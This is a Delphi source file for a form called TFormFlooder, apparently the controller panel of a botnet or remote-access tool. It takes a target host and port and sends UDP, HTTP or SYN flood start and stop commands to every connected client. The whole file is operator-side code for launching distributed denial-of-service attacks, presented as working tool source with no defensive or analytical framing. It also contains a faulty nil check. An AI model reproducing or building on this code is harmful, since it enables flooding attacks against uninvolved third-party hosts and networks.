unit UnitFlooder;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, jpeg, ExtCtrls, acImage, ComCtrls, ToolWin, Spin, StdCtrls, UnitMain,
  SocketUnitEx, UnitCommands, UnitFunctions, UnitVariables, UnitConstants,
  acProgressBar, uJSONConfig;

type
  TFormFlooder = class(TForm)
    tlb1: TToolBar;
    btn1: TToolButton;
    rg1: TRadioGroup;
    grp1: TGroupBox;
    lbl17: TLabel;
    lbl1: TLabel;
    edtTarget: TEdit;
    sePort: TSpinEdit;
    btn2: TToolButton;
    sprgrsbr1: TsProgressBar;
    lbl2: TLabel;
    procedure btn1Click(Sender: TObject);
    procedure rg1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  FormFlooder: TFormFlooder;

implementation

{$R *.dfm}

procedure TFormFlooder.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormFlooder.btn1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin
  if btn1.Down = True then
  begin
    if edtTarget.Text = '' then
    begin
      btn1.Down := False;
      Exit;
    end;

    rg1.Enabled := False;
    sprgrsbr1.Visible := True;

    case rg1.ItemIndex of
      0:  begin
            for i := 0 to ClientsList.Count - 1 do
            begin
              ClientDatas := TClientDatas(ClientsList[i]);
              if (ClientDatas.Node = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
              ClientDatas.SendDatas(FLOODERUDPSTART + '|' + edtTarget.Text + '|' + sePort.Text);
            end;
          end;

      1:  begin
            for i := 0 to ClientsList.Count - 1 do
            begin
              ClientDatas := TClientDatas(ClientsList[i]);
              if (ClientDatas.Node = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
              ClientDatas.SendDatas(FLOODERHTTPSTART + '|' + edtTarget.Text);
            end;
          end;

      2:  begin
            for i:=0 to ClientsList.Count-1 do
            begin
              ClientDatas := TClientDatas(ClientsList[i]);
              if (ClientDatas.Node = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
              ClientDatas.SendDatas(FLOODERSYNSTART + '|' + edtTarget.Text + '|' + sePort.Text);
            end;
          end;
    end;
  end
  else
  begin
    case rg1.ItemIndex of
      0:  begin
            for i := 0 to ClientsList.Count - 1 do
            begin
              ClientDatas := TClientDatas(ClientsList[i]);
              if (ClientDatas.Node = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
              ClientDatas.SendDatas(FLOODERUDPSTOP + '|');
            end;
          end;

      1:  begin
            for i := 0 to ClientsList.Count - 1 do
            begin
              ClientDatas := TClientDatas(ClientsList[i]);
              if (ClientDatas.Node = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
              ClientDatas.SendDatas(FLOODERHTTPSTOP + '|');
            end;
          end;

      2:  begin
            for i := 0 to ClientsList.Count-1 do
            begin
              ClientDatas := TClientDatas(ClientsList[i]);
              if (ClientDatas.Node = nil) and (ClientDatas.Node.ChildCount > 0) then Continue;
              ClientDatas.SendDatas(FLOODERSYNSTOP + '|');
            end;
          end;
    end;

    rg1.Enabled := True;
    sprgrsbr1.Visible := False;
  end;
end;

procedure TFormFlooder.rg1Click(Sender: TObject);
begin
  if rg1.ItemIndex = 1 then
  begin
    sePort.Value := 80;
    sePort.Enabled := False;
  end
  else sePort.Enabled := True;
end;

procedure TFormFlooder.FormShow(Sender: TObject);
begin
  lbl2.Caption := 'Total clients connected: ' + IntToStr(ClientsList.Count);
end;

procedure TFormFlooder.FormCreate(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  i: Integer;
begin
  //Load windows position settings
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  i := JSONConfig.ReadInteger('Flooder left');
  if i <= 0 then Left := (Screen.Width - Width) div 2 else Left := i;
  i := JSONConfig.ReadInteger('Flooder top');
  if i <= 0 then Top := (Screen.Height - Height) div 2 else Top := i;
  JSONConfig.Free;
end;

procedure TFormFlooder.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  JSONConfig: TJSONConfig;
begin
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.WriteInteger('Flooder left', Left);
  JSONConfig.WriteInteger('Flooder top', Top);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

end.
